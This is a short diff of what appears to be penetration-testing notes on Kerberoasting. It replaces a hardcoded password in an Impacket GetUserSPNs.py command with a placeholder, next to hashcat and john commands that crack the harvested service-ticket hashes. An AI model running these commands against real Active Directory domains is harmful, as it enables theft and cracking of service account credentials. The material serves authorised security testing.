@@ -49,7 +49,7 @@ hashcat -m13100 -a 0 hash_clean.txt Top1m.txt --force --potfile-disable
 IMPACKET PYTHON
 ====
 
-./GetUserSPNs.py acme.local/testadmin:Password1234! -o spns.txt -request -dc-ip 10.0.0.4
+./GetUserSPNs.py acme.local/testadmin:PROVIDED_PASSWORD -o spns.txt -request -dc-ip 10.0.0.4
 
 john --wordlist=Top1m.txt spns.txt
 
